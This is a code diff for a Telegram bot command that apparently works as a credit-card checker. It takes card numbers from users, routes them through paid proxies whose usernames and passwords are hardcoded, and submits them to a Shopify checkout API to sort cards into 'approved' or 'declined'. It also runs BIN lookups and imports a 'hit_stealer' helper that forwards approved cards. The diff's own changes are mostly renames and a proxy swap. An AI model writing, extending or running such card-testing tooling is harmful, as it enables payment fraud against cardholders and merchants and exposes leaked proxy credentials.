@@ -6,7 +6,7 @@ from httpx import AsyncHTTPTransport
 from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
 from plugins.tools.hit_stealer import send_hit_if_approved
 
-@Client.on_message(filters.command("sh", prefixes=["/", "."]), group=96)
+@Client.on_message(filters.command("sh", prefixes=["/", "."]), group=95)
 async def cmd_sh(client, message):
     try:
         user_id = str(message.from_user.id)
@@ -25,7 +25,7 @@ async def cmd_sh(client, message):
 
         if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply(
-                "Premium Users Required ⚠️\nOnly Premium users can use this command in bot PM.\nJoin group for free use:",
+                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin our group to use it for FREE:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                 ]),
@@ -33,14 +33,14 @@ async def cmd_sh(client, message):
             )
 
         with open("plugins/group.txt") as f:
-            GROUP = f.read().splitlines()
-        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
+            allowed_groups = f.read().splitlines()
+        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in allowed_groups:
             return await message.reply("❌ Unauthorized group. Contact admin.")
 
         if credit < 1:
             return await message.reply("❌ Insufficient credit.")
         if now - antispam_time < wait_time:
-            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
+            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")
 
         cc_text = message.reply_to_message.text if message.reply_to_message else (
             message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
@@ -65,8 +65,7 @@ f"""<code>┏━━━━━━━⍟</code>
 
         tic = time.perf_counter()
 
-        proxy_url = "http://purevpn0s9161585:E7n0nNSvISnTr7@prox-au.pointtoserver.com:10799"
-        raw_proxy = "prox-au.pointtoserver.com:10799:purevpn0s9161585:E7n0nNSvISnTr7"
+        proxy_url = "http://Indexui184a999e:4fba9e5235e8@proxy.speedproxies.net:12321"
         transport = AsyncHTTPTransport(proxy=proxy_url)
 
         try:
@@ -77,19 +76,18 @@ f"""<code>┏━━━━━━━⍟</code>
                         "card": fullcc,
                         "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
                         "email": None,
-                        "proxy": raw_proxy,
+                        "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                         "ship_address": None,
                         "is_shippable": False
                     }
                 }
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                 data = res.json()
-                msg_raw = data.get("message") or data.get("error") or "No response"
-                msg_check = msg_raw.lower()
+                raw_msg = data.get("message") or data.get("error") or "No response"
+                msg_check = raw_msg.lower()
                 card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
-                card_message = msg_raw
+                card_message = raw_msg
 
-                # BIN Lookup
                 binres = await http_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
                 bininfo = binres.json()
                 brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
@@ -136,4 +134,4 @@ f"""<code>┏━━━━━━━⍟</code>
         plan_expirychk(user_id)
 
     except Exception as e:
-        await message.reply_text(f"❌ Error: {str(e)}")
+        await message.reply(f"❌ Error: {str(e)}")
